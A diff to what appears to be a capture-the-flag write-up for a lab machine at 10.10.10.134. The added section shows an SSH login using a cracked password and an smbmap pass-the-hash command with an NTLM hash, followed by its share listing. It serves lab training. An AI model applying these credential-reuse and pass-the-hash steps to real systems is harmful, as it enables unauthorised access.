@@ -126,7 +126,24 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 bureaulampje     (L4mpje)
 ```
 
+# User
 
+Access 
+```
+ssh l4mpje@10.10.10.134
+bureaulampje
+```
+or
+```
+smbmap -u l4mpje -p aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9 -H 10.10.10.134
+[+] IP: 10.10.10.134:445        Name: 10.10.10.134                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        Backups                                                 READ, WRITE
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+```
 
 
 
